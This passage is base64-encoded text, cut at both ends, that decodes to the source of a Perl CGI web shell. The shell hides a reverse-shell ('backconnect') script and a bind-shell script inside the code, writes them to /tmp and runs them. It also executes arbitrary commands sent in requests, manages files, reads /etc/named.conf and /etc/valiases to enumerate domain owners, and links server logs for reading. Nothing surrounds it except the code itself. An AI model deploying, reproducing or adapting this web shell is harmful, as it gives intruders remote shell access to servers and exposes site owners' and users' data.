ld5dGRJRk41YzNSbGJXbHVabTg2SUNjN0lIVnVZVzFsSUMxaE8yVmphRzg3WldOb2J5QW5XeXRkSUZWelpYSnBibVp2T2lBbk95QnBaRHRsWTJodk8yVmphRzhnSjFzclhTQkVhWEpsWTNSdmNuazZJQ2M3SUhCM1pEdGxZMmh2T3lCbFkyaHZJQ2RiSzEwZ1UyaGxiR3c2SUNjN0pGTm9aV3hzSWlrN0RRcGpiRzl6WlNCVFQwTkxSVlE3IjsNCgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lRaElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOw0KDQoJJENsaWVudEFkZHIgPSAkaW57J2NsaWVudGFkZHInfTsNCgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7DQoJaWYoJENsaWVudFBvcnQgZXEgMCkNCgl7DQoJCXJldHVybiAmQmFja0JpbmRGb3JtOw0KCX1lbHNpZighJENsaWVudEFkZHIgZXEgIiIpDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7DQoJCWlmKC13ICIvdG1wLyIpDQoJCXsNCgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJDQoJCX1lbHNlDQoJCXsNCgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7DQoJCX0NCgkJb3BlbihGSUxFLCAiPiRGaWxlIik7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXN5c3RlbSgicGVybCBiYWNrY29ubmVjdC5wbCAkQ2xpZW50QWRkciAkQ2xpZW50UG9ydCIpOw0KCQl1bmxpbmsoJEZpbGUpOw0KCQlleGl0IDA7DQoJfWVsc2UNCgl7DQoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJpbmRwZXJsKTsNCgkJaWYoLXcgIi90bXAiKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iaW5kcG9ydC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmluZHBvcnQucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUm1EaXIoJCkgDQp7DQoJbXkgJGRpciA9IHNoaWZ0Ow0KICAgIGlmKG9wZW5kaXIoRElSLCRkaXIpKQ0KCXsNCgkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCXsNCgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkNCgkJCXsNCgkJCQkkZmlsZT0gJGRpci4kUGF0aFNlcC4kZmlsZTsNCgkJCQlpZigtZCAkZmlsZSkNCgkJCQl7DQoJCQkJCSZSbURpcigkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXVubGluaygkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCWNsb3NlZGlyKERJUik7DQoJfQ0KCWlmKCFybWRpcigkZGlyKSkNCgl7DQoJCQ0KCX0NCn0NCnN1YiBGaWxlT3duZXIoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsNV07DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJcmV0dXJuICI/Pz8iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJG5hbWU9Z2V0cHd1aWQoJHVpZCk7DQoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7DQoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsNCgkJfQ0KCX0NCglyZXR1cm4gIj8/PyI7DQp9DQpzdWIgUGFyZW50Rm9sZGVyKCQpDQp7DQoJbXkgJHBhdGggPSBzaGlmdDsNCglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7DQoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOw0KCXJldHVybiAkcGF0aDsNCn0NCnN1YiBGaWxlUGVybXMoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCW15ICR1ciA9ICItIjsNCglteSAkdXcgPSAiLSI7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9DQoJCQlpZigtdyAkZmlsZSl7ICR1dyA9ICJ3IjsgfQ0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3Ow0KCQl9ZWxzZQ0KCQl7DQoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOw0KCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsNCgkJCXJldHVybiAkcmVzdWx0Ow0KCQl9DQoJfQ0KCXJldHVybiAiMDAwMCI7DQp9DQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07DQoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07DQoJCSR5ID0gJHkgKyAxOTAwOw0KCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87DQoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOw0KCQlyZXR1cm4gJGxtdGltZTsNCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIEZpbGVTaXplKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZiAkZmlsZSkNCgl7DQoJCXJldHVybiAtcyAkZmlsZTsNCgl9DQoJcmV0dXJuICIwIjsNCg0KfQ0Kc3ViIFBhcnNlRmlsZVNpemUoJCkNCnsNCglteSAkc2l6ZSA9IHNoaWZ0Ow0KCWlmKCRzaXplIDw9IDEwMjQpDQoJew0KCQlyZXR1cm4gJHNpemUuICIgQiI7DQoJfQ0KCWVsc2UNCgl7DQoJCWlmKCRzaXplIDw9IDEwMjQqMTAyNCkgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBLQiI7DQoJCX0NCgkJZWxzZSANCgkJew0KCQkJJHNpemUgPSBzcHJpbnRmKCIlLjJmIiwkc2l6ZSAvIDEwMjQgLyAxMDI0KTsNCgkJCXJldHVybiAkc2l6ZS4iIE1CIjsNCgkJfQ0KCX0NCn0NCnN1YiB0cmltKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmcgPX4gcy9eXHMrLy87DQoJJHN0cmluZyA9fiBzL1xzKyQvLzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBBZGRTbGFzaGVzKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmc9fiBzL1xcL1xcXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBMaXN0RGlyDQp7DQoJbXkgJHBhdGggPSAkQ3VycmVudERpci4kUGF0aFNlcDsNCgkkcGF0aD1+IHMvXFxcXC9cXC9nOw0KCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOw0KCWlmKC1kICRwYXRoKQ0KCXsNCgkJbXkgQGZuYW1lID0gKCk7DQoJCW15IEBkbmFtZSA9ICgpOw0KCQlpZihvcGVuZGlyKERJUiwkcGF0aCkpDQoJCXsNCgkJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQkJew0KCQkJCSRmPSRwYXRoLiRmaWxlOw0KCQkJCWlmKC1kICRmKQ0KCQkJCXsNCgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQlwdXNoKEBmbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQkJY2xvc2VkaXIoRElSKTsNCgkJfQ0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7DQoJCUBkbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBkbmFtZTsNCgkJJHJlc3VsdCAuPSAiPGRpdj48dGFibGUgd2lkdGg9JzkwJScgY2xhc3M9J2xpc3RkaXInPg0KDQoJCTx0ciBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjogIzNlM2UzZSc+PHRoPkZpbGUgTmFtZTwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5GaWxlIFNpemU8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+UGVybWlzc2lvbjwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTUwcHg7Jz5MYXN0IE1vZGlmaWVkPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOw0KCQlteSAkc3R5bGU9ImxpbmUiOw0KCQlteSAkaT0wOw0KCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZCA9ICZ0cmltKCRkKTsNCgkJCSRkaXJuYW1lPSRkOw0KCQkJaWYoJGQgZXEgIi4uIikgDQoJCQl7DQoJCQkJJGQgPSAmUGFyZW50Rm9sZGVyKCRwYXRoKTsNCgkJCX0NCgkJCWVsc2lmKCRkIGVxICIuIikgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aDsNCgkJCX0NCgkJCWVsc2UgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aC4kZDsNCgkJCX0NCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz4NCg0KCQkJPHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPjxhICBocmVmPSc/YT1ndWkmZD0iLiRkLiInPlsgIi4kZGlybmFtZS4iIF08L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOycgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZCkuIicsJyIuJGRpcm5hbWUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCIuJGkuIiwnIi4kZGlybmFtZS4iJylcIiA+Ii4mRmlsZVBlcm1zKCRkKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQlmb3JlYWNoIG15ICRmIChAZm5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZT0kZjsNCgkJCSRmID0gJHBhdGguJGY7DQoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyc+PGEgaHJlZj0nP2E9Y29tbWFuZCZkPSIuJHBhdGguIiZjPWVkaXQlMjAiLiRmaWxlLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mUGFyc2VGaWxlU2l6ZSgmRmlsZVNpemUoJGYpKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRmKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8L3RyPiI7DQoJCQkkaSsrOw0KCQl9DQoJCSRyZXN1bHQgLj0gIjwvdGFibGU+PC9kaXY+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRyeSB0byBWaWV3IExpc3QgVXNlcg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdEb21haW5Vc2VyDQp7DQoJb3BlbiAoZG9tYWlucywgJy9ldGMvbmFtZWQuY29uZicpIG9yICRlcnI9MTsNCglteSBAY256cyA9IDxkb21haW5zPjsNCgljbG9zZSBkMG1haW5zOw0KCW15ICRzdHlsZT0ibGluZSI7DQoJbXkgJHJlc3VsdD0iPGg1Pjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Ib2FuZyBTYSAtIFRydW9uZyBTYTwvZm9udD48L2g1PiI7DQoJaWYgKCRlcnIpDQoJew0KCQkkcmVzdWx0IC49ICAoJzxwPkMwdWxkblwndCBCeXBhc3MgaXQgLCBTb3JyeTwvcD4nKTsNCgkJcmV0dXJuICRyZXN1bHQ7DQoJfWVsc2UNCgl7DQoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOw0KCX0NCglmb3JlYWNoIG15ICRvbmUgKEBjbnpzKQ0KCXsNCgkJaWYoJG9uZSA9fiBtLy4qP3pvbmUgIiguKj8pIiB7LykNCgkJewkNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZW5hbWU9ICIvZXRjL3ZhbGlhc2VzLyIuJG9uZTsNCgkJCSRvd25lciA9IGdldHB3dWlkKChzdGF0KCRmaWxlbmFtZSkpWzRdKTsNCgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBWaWV3IExvZw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdMb2cNCnsNCglpZigkV2luTlQpDQoJew0KCQlyZXR1cm4gIjxoMj48Zm9udCBzdHlsZT0nZm9udDogMjBwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+RG9uJ3QgcnVuIG9uIFdpbmRvd3M8L2ZvbnQ+PC9oMj4iOw0KCX0NCglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOw0KCW15IEBwYXRobG9nPSgNCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLA0KCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLA0KCQkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2FjY2Vzc19sb2cnDQoJCQkJKTsNCglteSAkaT0wOw0KCW15ICRwZXJtczsNCglteSAkc2w7DQoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykNCgl7DQoJCWlmKC13ICRsb2cpDQoJCXsNCgkJCSRwZXJtcz0iT0siOw0KCQl9ZWxzZQ0KCQl7DQoJCQljaG9wKCRzbCA9IGBsbiAtcyAkbG9nIGVycm9yX2xvZ18kaWApOw0KCQkJaWYoJnRyaW0oJGxzKSBlcSAiIikNCgkJCXsNCgkJCQlpZigtciAkbHMpDQoJCQkJew0KCQkJCQkkcGVybXM9Ik9LIjsNCgkJCQkJJGxvZz0iZXJyb3JfbG9nXyIuJGk7DQoJCQkJfQ0KCQkJfWVsc2UNCgkJCXsNCgkJCQkkcGVybXM9Ijxmb250IHN0eWxlPSdjb2xvcjogcmVkOyc+Q2FuY2VsPGZvbnQ+IjsNCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49PDxFTkQ7DQoJCTx0cj4NCg0KCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+DQoJCQk8dGQ+PGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlRyeSIgLz48L3RkPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImxvZ18kaSIgbmFtZT0iYyIgdmFsdWU9Imxlc3MgJGxvZyIvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiIC8+DQoJCQk8L2Zvcm0+DQoJCQk8dGQ+JHBlcm1zPC90ZD4NCg0KCQk8L3RyPg0KRU5EDQoJCSRpKys7DQoJfQ0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCiRBY3Rpb24gPSAkaW57J2EnfTsNCg0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdA0KDQojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkDQokQ3VycmVudERpciA9ICZ0cmltKCRpbnsnZCd9KTsNCiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQ0KJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiIGlmKCRSdW5Db21tYW5kIGVxICIiKTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luDQp7DQoJJlBlcmZvcm1Mb2dpbjsNCn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCWlmKCEoJGNobW9kIGVxIDApKQ0KCQl7DQoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCQkJY2hvcCgkcmVzdWx0PSBgY2htb2QgJGNobW9kICIkZmlsZSJgKTsNCgkJCWlmKCZ0cmltKCRyZXN1bHQpIGVxICIiKQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJCX0NCgkJfQ0KCX0NCgkkcmVuYW1lPSRpbnsncmVuYW1lJ307DQoJaWYoISRyZW5hbWUgZXEgIiIpDQoJew0KCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkNCgkJew0KCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQl